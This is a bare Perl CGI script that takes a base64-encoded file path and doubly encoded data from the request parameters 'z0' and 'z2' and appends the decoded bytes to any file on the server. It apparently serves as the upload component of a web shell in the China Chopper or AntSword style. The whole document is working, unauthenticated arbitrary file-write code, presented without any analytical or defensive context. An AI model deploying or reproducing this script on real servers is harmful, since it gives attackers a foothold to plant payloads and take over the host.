use strict;
use warnings;
use CGI;
use MIME::Base64 qw(decode_base64);

$| = 1;

my $q = CGI->new;

my $file_path   = decode_base64($q->param('z0') || '');
my $base64_data = decode_base64($q->param('z2') || '');

$base64_data =~ s/\r|\n//g;

my $buffer = decode_base64($base64_data);

if (open(my $fh, '>>', $file_path)) {
    binmode($fh);
    print $fh $buffer;
    close($fh);
    print "1";
} else {
    print "0";
}